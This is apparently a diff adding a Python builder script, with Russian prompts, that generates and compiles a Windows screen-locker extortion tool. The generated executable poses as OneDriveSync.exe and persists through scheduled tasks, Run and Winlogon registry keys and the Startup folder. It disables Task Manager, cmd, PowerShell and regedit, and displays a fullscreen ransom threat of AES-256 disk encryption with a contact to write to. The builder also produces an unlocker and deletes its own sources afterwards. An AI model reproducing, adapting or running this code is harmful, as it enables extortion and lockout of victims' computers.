@@ -1,0 +1,476 @@
+import os
+import sys
+import subprocess
+import socket
+import getpass
+
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+os.chdir(BASE_DIR)
+
+CURRENT_PC_NAME = socket.gethostname()
+CURRENT_USER = getpass.getuser()
+
+print("=" * 60)
+print("  ZORG BUILDER")
+print("=" * 60)
+print(f"[*] PC={CURRENT_PC_NAME}, USER={CURRENT_USER}")
+print(f"[*] На этом ПК винлокер НЕ запустится\n")
+
+print("[?] Выбери иконку (.ico). Оставь пустым — без иконки.")
+ICON_FILE = input("Путь к .ico (Enter = пропустить): ").strip().strip('"')
+if ICON_FILE and not os.path.exists(ICON_FILE):
+    print(f"[!] Файл {ICON_FILE} не найден — собираю без иконки")
+    ICON_FILE = ""
+
+name = input("[?] Имя винлокера (Enter = SynapseLauncher): ").strip()
+OUTPUT_NAME = name if name else "SynapseLauncher"
+
+contact = input("[?] Кому писать для разблокировки (Enter = _tt333s): ").strip()
+if not contact:
+    contact = "_tt333s"
+
+contact2 = input("[?] Второй контакт (Enter = пропустить): ").strip()
+
+print(f"\n[*] Иконка: {ICON_FILE or 'нет'}")
+print(f"[*] Имя exe: {OUTPUT_NAME}.exe")
+print(f"[*] Контакт: {contact}")
+print(f"[*] Второй контакт: {contact2 or 'нет'}\n")
+
+def ensure_dependencies():
+    required = ["pyinstaller", "keyboard"]
+    for pkg in required:
+        try:
+            __import__(pkg.replace("-", "_").split("==")[0])
+            print(f"[+] {pkg} установлен")
+        except ImportError:
+            print(f"[*] Устанавливаю {pkg}...")
+            subprocess.run([sys.executable, "-m", "pip", "install", pkg, "--quiet"], check=False)
+
+ensure_dependencies()
+
+CONTACTS_BLOCK = f"""                                                    Сейчас у тебя 12 часов, чтобы написать мне:  
+                                                    ▸ {contact}  
+"""
+if contact2:
+    CONTACTS_BLOCK += f"                                                    ▸ {contact2}  \n"
+
+CONTACTS_BLOCK_ENG = f"""                                                    You've got 12 hours to hit me up:  
+                                                    ▸ {contact}   
+"""
+if contact2:
+    CONTACTS_BLOCK_ENG += f"                                                    ▸ {contact2}   \n"
+
+ASCII_ART = r"""
+                                                                      ....:::....
+                                                                .:-=++**#######**++=-:.                                                                
+                                                          .:=+##*#####+=-:::::-=+########+=:.                                                          
+                                                      .-+##+=:.-*#*=.             .=*#*-.:=+##+-.                                                      
+                                                   :+##+-. .:=##*:                   :*##=:. .-+##+-                                                   
+                                               .-*#*-. .:---+##=                       =##+---:. .-*#*-.                                               
+                                             -*#*- .:---==-=##-                         -##+------:. -*#*-                                             
+                                          :+#*-..:----=====##+                           =##=---===--:..-*#+:                                          
+                                        -*#+: :---==--===-+##.             ..            .##+----===----: :+#*-                                        
+                                      =##=..:--=-=----===-*#*            =###=            *#*-----=-====--:..=##=                                      
+                                     .+##- .--==-----===--*#*            +###+            *#*-----=-=-==---. -*#+.                                     
+                                       .=##= .:------====-+##             :-:             ##+---=-=-----:. -##=.                                       
+                                          -*#+: .--=====--=##=                           =##=---------. :+#*-                                          
+                                            .=##=: .----=--+##:                         :##+-------. .=##=.                                            
+                                               :=##=: .:-=--+##-                       -##+----:. :=##=:                                               
+                                                  .=*#*-. .:-+##+.                   .+##+-:. .-+#*=:                                                  
+                                                     .-+##+=:..=##+:               :+##+..:=+##+-.                                                     
+                                                         .:=+*#**####+=:.......:=+####**##+=:.                                                         
+                                                               .-=++*#############**+=-.                                                               
+                                                                        ::::::                                                                       
+                                                    ═══════════════════════════════════════════  
+                                                    [RU]
+                                                    Твоя тачка легла. Полностью.
+                                                    Я захватил управление, и ты даже не чихнёшь.
+
+""" + CONTACTS_BLOCK + r"""
+                                                    Не напишешь — твой винт улетит в AES-256 без шанса на восстановление.
+                                                    Ключ только у меня. Никакие прогеры, бэкапы или переустановка не помогут.
+
+                                                    Не тупи. Не пытайся сбросить пароль, не дёргай шнур.
+                                                    Если я увижу активность — время сожмётся до 6 часов.
+
+                                                    Жди моего ответа. И не ссы — я свяжусь, если ты сделаешь всё правильно.
+
+                                                    Таймер запущен.
+                                                    ═══════════════════════════════════════════
+                                                    [ENG]
+                                                    Your box is down. Fully down.
+                                                    I took control, and you won't even sneeze without my permission.
+
+""" + CONTACTS_BLOCK_ENG + r"""
+                                                    No message — your drive gets AES-256 locked, and there's no coming back.
+                                                    The key stays with me. No recovery tools, no backups, no reinstall — all useless.
+
+                                                    Don't be a dumbass. Don't try to reset anything, don't pull the plug.
+                                                    If I see any weird activity — I cut the timer to 6 hours.
+
+                                                    Wait for my reply. And chill — I'll get back to you if you play it right.
+
+                                                    Timer's ticking.
+                                                    ═══════════════════════════════════════════
+"""
+
+
+PAYLOAD_CODE = '''import sys, os, ctypes, time, threading, subprocess, socket, getpass, shutil
+import tkinter as tk
+import keyboard
+
+BUILDER_PC = "''' + CURRENT_PC_NAME + '''"
+BUILDER_USER = "''' + CURRENT_USER + '''"
+
+def is_my_pc():
+    try:
+        return socket.gethostname().lower() == BUILDER_PC.lower() and getpass.getuser().lower() == BUILDER_USER.lower()
+    except:
+        return False
+
+if is_my_pc():
+    sys.exit(0)
+
+TASK_NAME = "OneDrive Startup Task-S-2-4-22-1426727962-763501467-2455579829-3762"
+COPIES = [
+    os.path.join(os.environ.get("APPDATA", ""),
+                 r"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\OneDriveSync.exe"),
+    os.path.join(os.environ.get("LOCALAPPDATA", ""), "OneDriveSync.exe"),
+    os.path.join(os.environ.get("PROGRAMDATA", "C:\\\\ProgramData"), "OneDriveSync.exe"),
+]
+
+def spread_copies():
+    src = sys.executable
+    for dst in COPIES:
+        try:
+            d = os.path.dirname(dst)
+            if d and not os.path.isdir(d):
+                os.makedirs(d, exist_ok=True)
+            if os.path.abspath(src) != os.path.abspath(dst):
+                shutil.copy2(src, dst)
+                ctypes.windll.kernel32.SetFileAttributesW(dst, 0x02)
+        except: pass
+
+def delete_copies():
+    for dst in COPIES:
+        try:
+            if os.path.exists(dst):
+                ctypes.windll.kernel32.SetFileAttributesW(dst, 0x80)
+                os.remove(dst)
+        except: pass
+
+def add_to_startup():
+    spread_copies()
+    exe = sys.executable
+    try:
+        subprocess.run(f'schtasks /create /tn "{TASK_NAME}" /tr "{exe}" /sc onlogon /rl highest /f',
+                       shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+    except: pass
+    for hive in ("HKLM", "HKCU"):
+        try:
+            import winreg
+            h = winreg.HKEY_LOCAL_MACHINE if hive == "HKLM" else winreg.HKEY_CURRENT_USER
+            key = winreg.OpenKey(h, r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, TASK_NAME, 0, winreg.REG_SZ, exe)
+            winreg.CloseKey(key)
+        except: pass
+    try:
+        import winreg
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
+                             r"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon",
+                             0, winreg.KEY_SET_VALUE | winreg.KEY_READ)
+        try:
+            cur, _ = winreg.QueryValueEx(key, "Userinit")
+        except FileNotFoundError:
+            cur = r"C:\\\\Windows\\\\system32\\\\userinit.exe,"
+        if exe not in cur:
+            new = cur.rstrip(",") + "," + exe
+            winreg.SetValueEx(key, "Userinit", 0, winreg.REG_SZ, new)
+        winreg.CloseKey(key)
+    except: pass
+    try:
+        startup_dir = os.path.join(os.environ["APPDATA"],
+                                   r"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup")
+        if os.path.isdir(startup_dir):
+            dst = os.path.join(startup_dir, "OneDriveSync.exe")
+            if os.path.abspath(exe) != os.path.abspath(dst):
+                shutil.copy2(exe, dst)
+            bat = os.path.join(startup_dir, "OneDrive.bat")
+            with open(bat, "w") as f:
+                f.write(f'@echo off\\nstart "" "{dst}"\\n')
+            ctypes.windll.kernel32.SetFileAttributesW(bat, 0x02)
+    except: pass
+
+def remove_from_startup():
+    try:
+        subprocess.run(f'schtasks /delete /tn "{TASK_NAME}" /f', shell=True,
+                       capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+    except: pass
+    try:
+        import winreg
+        for h in (winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER):
+            try:
+                key = winreg.OpenKey(h, r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, winreg.KEY_SET_VALUE)
+                winreg.DeleteValue(key, TASK_NAME)
+                winreg.CloseKey(key)
+            except: pass
+    except: pass
+    try:
+        import winreg
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
+                             r"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon",
+                             0, winreg.KEY_SET_VALUE | winreg.KEY_READ)
+        cur, _ = winreg.QueryValueEx(key, "Userinit")
+        parts = [p for p in cur.split(",") if "OneDrive" not in p and "Synapse" not in p and p.strip()]
+        winreg.SetValueEx(key, "Userinit", 0, winreg.REG_SZ, ",".join(parts))
+        winreg.CloseKey(key)
+    except: pass
+    try:
+        startup_dir = os.path.join(os.environ["APPDATA"],
+                                   r"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup")
+        for f in ["OneDriveSync.exe", "OneDrive.bat"]:
+            p = os.path.join(startup_dir, f)
+            if os.path.exists(p):
+                ctypes.windll.kernel32.SetFileAttributesW(p, 0x80)
+                os.remove(p)
+    except: pass
+    delete_copies()
+
+def block_keys():
+    try:
+        import winreg
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
+                               r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer")
+        winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 1)
+        winreg.SetValueEx(key, "DisallowRun", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key)
+        key2 = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
+                                r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\DisallowRun")
+        for i, t in enumerate(["taskmgr.exe", "cmd.exe", "powershell.exe", "regedit.exe"], 1):
+            winreg.SetValueEx(key2, str(i), 0, winreg.REG_SZ, t)
+        winreg.CloseKey(key2)
+    except: pass
+    try:
+        import winreg
+        for hive in (winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE):
+            try:
+                key = winreg.OpenKey(hive,
+                                     r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System",
+                                     0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
+                winreg.CloseKey(key)
+            except: pass
+    except: pass
+
+def unblock_keys():
+    try:
+        import winreg
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                             r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer",
+                             0, winreg.KEY_SET_VALUE)
+        for v in ("NoWinKeys", "DisallowRun"):
+            try: winreg.DeleteValue(key, v)
+            except FileNotFoundError: pass
+        winreg.CloseKey(key)
+    except: pass
+    try:
+        import winreg
+        for hive in (winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE):
+            try:
+                key = winreg.OpenKey(hive,
+                                     r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System",
+                                     0, winreg.KEY_SET_VALUE)
+                winreg.DeleteValue(key, "DisableTaskMgr")
+                winreg.CloseKey(key)
+            except: pass
+    except: pass
+
+def watch_esc():
+    while True:
+        if keyboard.is_pressed('esc'):
+            start = time.time()
+            while keyboard.is_pressed('esc'):
+                if time.time() - start >= 5:
+                    unblock_keys()
+                    remove_from_startup()
+                    os._exit(0)
+                time.sleep(0.1)
+        time.sleep(0.1)
+
+ASCII_ART = r"""''' + ASCII_ART + '''"""
+
+def show_locker():
+    root = tk.Tk()
+    root.overrideredirect(True)
+    root.attributes('-topmost', True)
+    user32 = ctypes.windll.user32
+    vx = user32.GetSystemMetrics(76); vy = user32.GetSystemMetrics(77)
+    vw = user32.GetSystemMetrics(78); vh = user32.GetSystemMetrics(79)
+    root.geometry(f"{vw}x{vh}+{vx}+{vy}")
+    root.configure(bg='black')
+    root.focus_set()
+    root.grab_set()
+    root.protocol("WM_DELETE_WINDOW", lambda: None)
+    def on_key(e):
+        if (e.keysym == 'F4' and e.state & 4) or (e.keysym == 'Tab' and e.state & 4) or (e.keysym in ('L','D','E') and e.state & 8):
+            return "break"
+    root.bind('<Key>', on_key)
+    tk.Label(root, text=ASCII_ART, fg='white', bg='black',
+             justify='left', font=('Consolas', 10)).pack(side='top', fill='x', padx=10, pady=5)
+    root.mainloop()
+
+def main():
+    try:
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        is_admin = False
+    if not is_admin:
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+        sys.exit(0)
+    add_to_startup()
+    block_keys()
+    threading.Thread(target=watch_esc, daemon=True).start()
+    show_locker()
+
+if __name__ == "__main__":
+    main()
+'''
+
+
+UNLOCKER_CODE = '''import os, sys, ctypes, subprocess, time
+import winreg
+import tkinter as tk
+from tkinter import messagebox
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+if not is_admin():
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+    sys.exit()
+
+TASK_NAME = "OneDrive Startup Task-S-2-4-22-1426727962-763501467-2455579829-3762"
+
+try:
+    subprocess.run(f'schtasks /delete /tn "{TASK_NAME}" /f', shell=True, capture_output=True)
+except: pass
+
+for hive in (winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER):
+    try:
+        key = winreg.OpenKey(hive, r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, winreg.KEY_SET_VALUE)
+        try: winreg.DeleteValue(key, TASK_NAME)
+        except FileNotFoundError: pass
+        winreg.CloseKey(key)
+    except: pass
+
+try:
+    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
+                         r"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon",
+                         0, winreg.KEY_SET_VALUE | winreg.KEY_READ)
+    cur, _ = winreg.QueryValueEx(key, "Userinit")
+    parts = [p for p in cur.split(",") if "OneDrive" not in p and "Synapse" not in p and p.strip()]
+    winreg.SetValueEx(key, "Userinit", 0, winreg.REG_SZ, ",".join(parts))
+    winreg.CloseKey(key)
+except: pass
+
+try:
+    startup_dir = os.path.join(os.environ["APPDATA"],
+                               r"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup")
+    for f in ["OneDriveSync.exe", "OneDrive.bat"]:
+        p = os.path.join(startup_dir, f)
+        if os.path.exists(p):
+            ctypes.windll.kernel32.SetFileAttributesW(p, 0x80)
+            os.remove(p)
+except: pass
+
+for c in [
+    os.path.join(os.environ.get("LOCALAPPDATA", ""), "OneDriveSync.exe"),
+    os.path.join(os.environ.get("PROGRAMDATA", "C:\\\\ProgramData"), "OneDriveSync.exe"),
+]:
+    try:
+        if os.path.exists(c):
+            ctypes.windll.kernel32.SetFileAttributesW(c, 0x80)
+            os.remove(c)
+    except: pass
+
+for hive in (winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE):
+    try:
+        key = winreg.OpenKey(hive, r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System", 0, winreg.KEY_SET_VALUE)
+        try: winreg.DeleteValue(key, "DisableTaskMgr")
+        except FileNotFoundError: pass
+        winreg.CloseKey(key)
+    except: pass
+
+try:
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                         r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer", 0, winreg.KEY_SET_VALUE)
+    for v in ("NoWinKeys", "DisallowRun"):
+        try: winreg.DeleteValue(key, v)
+        except FileNotFoundError: pass
+    winreg.CloseKey(key)
+except: pass
+
+for proc in ["SynapseLauncher.exe", "OneDriveSync.exe", "ffplay.exe"]:
+    try: subprocess.run(f'taskkill /F /IM "{proc}"', shell=True, capture_output=True)
+    except: pass
+
+try:
+    subprocess.run("taskkill /F /IM explorer.exe", shell=True, capture_output=True)
+    time.sleep(1)
+    subprocess.Popen("explorer.exe", shell=True)
+except: pass
+
+root = tk.Tk()
+root.withdraw()
+messagebox.showinfo("Unlocker", "Система очищена! Все точки автозапуска удалены.")
+root.destroy()
+'''
+
+with open("volt_payload.py", "w", encoding="utf-8") as f:
+    f.write(PAYLOAD_CODE)
+with open("unlocker.py", "w", encoding="utf-8") as f:
+    f.write(UNLOCKER_CODE)
+
+print("[+] Созданы volt_payload.py и unlocker.py")
+
+print("\n[*] Собираю", OUTPUT_NAME + ".exe ...")
+cmd1 = [
+    sys.executable, "-m", "PyInstaller",
+    "--noconfirm", "--onefile", "--windowed", "--uac-admin",
+    "--name", OUTPUT_NAME,
+    "volt_payload.py"
+]
+if ICON_FILE:
+    cmd1.insert(-3, "--icon")
+    cmd1.insert(-3, ICON_FILE)
+subprocess.run(cmd1)
+
+print("\n[*] Собираю Unlocker.exe ...")
+cmd2 = [
+    sys.executable, "-m", "PyInstaller",
+    "--noconfirm", "--onefile", "--windowed", "--uac-admin",
+    "--name", "Unlocker",
+    "unlocker.py"
+]
+if ICON_FILE:
+    cmd2.insert(-3, "--icon")
+    cmd2.insert(-3, ICON_FILE)
+subprocess.run(cmd2)
+
+print("\n[*] Удаляю .py файлы...")
+for f in ["volt_payload.py", "unlocker.py", "build_all.py", "selfbuild.py", "launcher.py"]:
+    try:
+        if os.path.exists(f):
+            os.remove(f)
+            print(f"[+] Удалён {f}")
+    except: pass
+
+print("\n" + "=" * 60)
+print("  ГОТОВО!")
+print("=" * 60)
+print(f"\n  dist\\{OUTPUT_NAME}.exe  — винлокер")
+print(f"  dist\\Unlocker.exe         — чистильщик")
+print(f"\n[!] На этом ПК ({CURRENT_PC_NAME}\\{CURRENT_USER}) винлокер не запустится")
